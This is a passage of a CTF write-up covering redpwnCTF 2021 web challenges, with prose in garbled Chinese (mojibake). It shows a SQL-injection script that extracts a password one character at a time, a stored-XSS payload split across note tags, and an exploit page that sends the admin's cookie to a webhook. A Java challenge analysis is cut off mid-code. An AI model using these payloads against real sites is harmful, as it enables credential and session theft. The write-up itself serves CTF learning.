&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_char&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># random username since otherwise we error&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choices&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">allowed&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">k&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(SELECT substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) FROM users)||&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ClientSession&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;register&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tasks&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">allowed&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">tasks&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">try_pass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">gather&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">tasks&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#75715e"># without this we get an OSError due to too many open file descriptors&lt;/span>
&lt;span style="color:#111">sem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Semaphore&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">300&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">index_tasks&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">index_tasks&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">get_char&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">gather&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">index_tasks&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;Password: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webnotes">web/notes&lt;/h2>
&lt;blockquote>
&lt;p>Texting things to yourself, but online! &lt;a href="https://notes.mc.ax/">notes.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;em>Please put a reasonably secure password when making an account&lt;/em>&lt;/p>
&lt;p>Report problems &lt;a href="https://admin-bot.mc.ax/notes">here&lt;/a>.&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/b84015269379e24fc336a02b23656a1428e8bea965667738ede86e3c8e611ca1/notes.tar.gz">notes.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>å…ˆçœ‹é¡µé¢ æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå…ˆå¡«ç”¨æˆ·åå’Œå¯†ç å†ç‚¹loginæˆ–registerï¼Œå°è¯•test: testç™»å…¥ï¼Œç•Œé¢æ˜¯ä¸€ä¸ªå¯ä»¥åŠ notes è‡ªå®šbodyå’Œtagçš„app&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710144224462.png" alt="image-20210710144224462">&lt;/p>
&lt;p>åœ¨view notesçœ‹åˆ°å·²ç»æœ‰äººè¯•è¿‡xssäº†ï¼Œè¿™é‡Œæœ‰ä¸ªå°å°çš„è¶Šæƒæ¼æ´žï¼Œ/view/+usernameç›´æŽ¥å¯ä»¥çœ‹åˆ°å…¶ä»–çš„å¸ˆå‚…åœ¨å°è¯•ä»€ä¹ˆæ ·çš„payloadï¼ˆçœ‹äº†wpä»¥åŽæ‰æ„è¯†åˆ°è¿™é‡Œçš„tagéƒ¨åˆ†å°±æ˜¯æ³¨å…¥ç‚¹ è€Œå½“æ—¶çš„æˆ‘ä»¥ä¸ºæ˜¯å¡bugäº†&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710195356571.png" alt="image-20210710195356571">&lt;/p>
&lt;p>ç®€å•å®¡äº†ä¸‹æºç ï¼Œä¹Ÿæ²¡å•¥ç‰¹åˆ«çš„ï¼Œé¦–å…ˆåˆå§‹åŒ–ä¸€ä¸ªadminå·ï¼Œflagåœ¨adminçš„privateåˆ†ç±»çš„notesä¸­ï¼›å¯¹äºŽä¸ªäººå‘çš„notesä¼šè½¬ä¹‰bodyéƒ¨åˆ†ä¸ºhtmlå®žä½“æ¥é¢„é˜²xss&lt;/p>
&lt;p>ä½†æ˜¯è¿™ä¸ªnotes-appçš„å½¢å¼æ˜¯å¦¥å¦¥çš„xssäº†ï¼Œé‚£çªç ´å£åœ¨å“ªé‡Œæï¼Ÿå…¶å®žæ˜¯è¢«å¿½ç•¥çš„tagéƒ¨åˆ†ï¼ä¸€èˆ¬æƒ…å†µä¸‹çœ‹åˆ°tagå¯é€‰private/publicå°±ä¼šä¸å…³æ³¨è¿™é‡Œï¼Œä½†æ˜¯é…åˆç‰¹æ®Šçš„DOMè§£æž è¿™é‡Œæ— ç–‘æ˜¯æ³¨å…¥ç‚¹ï¼ä¸‹é¢ç®€å•åˆ†æžä¸€ä¸‹ï¼Œ&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#notes">å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>ä»Ž/static/view.htmlä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªnotes-appçš„å‰ç«¯æ¸²æŸ“æ‰€å‡­å€Ÿçš„æ¨¡æ¿é•¿å•¥æ ·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093357548.png" alt="image-20210806093357548">&lt;/p>
&lt;p>bodyéƒ¨åˆ†è¢«å®Œå…¨çš„ä¿æŠ¤äº†ï¼Œä½†æ˜¯tagæ²¡æœ‰è¿‡æ»¤ åªæ˜¯é™åˆ¶äº†ä¸ªæ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093711969.png" alt="image-20210806093711969">&lt;/p>
&lt;p>æˆ‘ä»¬åˆ©ç”¨çš„å°±æ˜¯æµè§ˆå™¨è§£æžhtmlçš„éƒ¨åˆ†ï¼Œå¯ä»¥è®©ä¸ç›¸å…³çš„å‡ ä¸ªnotesæ‹¼æŽ¥åœ¨ä¸€èµ·ï¼ˆä¸¾ä¸ªç®€å•çš„æ —å­ï¼šåœ¨ä¸€ä¸ªnoteé‡Œé¢ç”¨&lt;code>&amp;lt;p&amp;gt;&lt;/code> å¦ä¸€ä¸ªé‡Œé¢æ”¾&lt;code>&amp;lt;/p&amp;gt;&lt;/code>ï¼Œä¸­é—´çš„éƒ¨åˆ†ä¼šè¢«æ”¾åœ¨ä¸€èµ·ï¼‰è¿™é‡Œé€‰ç”¨çš„æ˜¯&lt;code>&amp;lt;style&amp;gt;&lt;/code>è¿™ä¸ªtagï¼Œåˆ©ç”¨å®ƒonloadçš„å±žæ€§&lt;/p>
&lt;p>è¿˜æœ‰ä¸€ä¸ªå¾…è§£å†³çš„é—®é¢˜æ˜¯ä¸Šä¸‹ä¸¤ä¸ªnotesä¹‹é—´ä¼šæœ‰&lt;code>&amp;lt;div class=&amp;quot;card&amp;quot;&amp;gt;&lt;/code>çš„å­˜åœ¨ï¼›è¿™ä¹Ÿæ˜¯ä¸ç”¨&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>å’Œå®ƒçš„onloadå±žæ€§çš„åŽŸå› ï¼Œå› ä¸ºæµè§ˆå™¨æ˜¯ä¸å…è®¸&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>ä¸­å±žæ€§æ¢è¡Œçš„&lt;/p>
&lt;p>æˆ‘ä»¬æœ€ç»ˆçš„payload&lt;/p>
&lt;pre tabindex="0">&lt;code>body: anything
tag: &amp;lt;style a='
body: anything
tag: 'onload='`
body: `;eval(somecode)/*
tag: */'&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ç„¶åŽæ˜¯å¸¸è§„çš„xss&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://notes.mc.ax/view/&amp;lt;username&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;navigator.sendBeacon(&amp;#39;&amp;lt;webhook server&amp;gt;&amp;#39;, document.cookie)&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webrequester">web/Requester&lt;/h2>
&lt;blockquote>
&lt;p>Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021&lt;/p>
&lt;p>&lt;a href="https://requester.mc.ax/">requester.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/d92499fb296055bd3767e8d5c707605ca56a00517726fa281fa35dfda611fdee/requester-release.zip">requester-release.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>javaå¯ä»¥è¯´æ˜¯å®Œå…¨ä¸æ‡‚ï¼Œæ¯”èµ›çš„æ—¶å€™å°±ç®€å•çœ‹äº†ä¸‹å°±æºœäº†ï¼Œå‚è€ƒ &lt;a href="https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/">è§£æ³•1 - _replicator&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester">è§£æ³•2 - _find&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806100214553.png" alt="image-20210806100214553">&lt;/p>
&lt;p>ä¸€ä¸ªç®€å•çš„java-appï¼Œæ£€æµ‹ç»™å‡ºçš„apiæ˜¯å¦æ­£å¸¸ å¹¶ä¸”è¿”å›žä¸€ä¸ªjson&lt;/p>
&lt;p>ç»™äº†docker&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710160029981.png" alt="image-20210710160029981">&lt;/p>
&lt;p>å…ˆç”¨jd-guiæ‰“å¼€jaråŒ…çœ‹çœ‹æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716211333162.png" alt="image-20210716211333162">&lt;/p>
&lt;p>å…ˆçœ‹Main.class&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Database&lt;/span> &lt;span style="color:#111">db&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;adminUser&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;adminPassword&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">javalinEnv&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;javalinEnv&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Database&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">adminUser&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">initializeDatabase&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">JavalinJte&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">configure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">createTemplateEngine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">javalinEnv&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#111">Javalin&lt;/span> &lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Javalin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">8080&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.jte&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/createUser&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Handlers&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">createUser&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/testAPI&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Handlers&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">testAPI&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>åšä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œï¼Œå–å‡ºadminçš„ç”¨æˆ·åå’Œå¯†ç ä»¥åŠflagçš„å€¼ï¼Œæ–°å»ºä¸€ä¸ªdatabaseï¼Œåˆ†å‡º3ä¸ªè·¯ç”±ï¼›&lt;/p>
&lt;p>å…ˆçœ‹database.classï¼ˆåˆ†æžçš„æ¯”è¾ƒè¯¦ç»† ä¹‹å‰åšjavaå¾ˆå°‘&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Database&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminUsername&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminPassword&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminUsername&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminPassword&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;@couchdb:5984/&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">matches&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;^[a-zA-Z0-9_]*$&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å­˜å‚¨ä»Žmain.classé‡ŒæŽ¥æ”¶åˆ°çš„adminUsername&amp;amp;adminPasswordï¼›&lt;code>getDbString()&lt;/code>è¿”å›žä¸€ä¸ªå¯ä»¥ç”¨æ¥è¿žæŽ¥couchdbæ•°æ®åº“çš„url&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
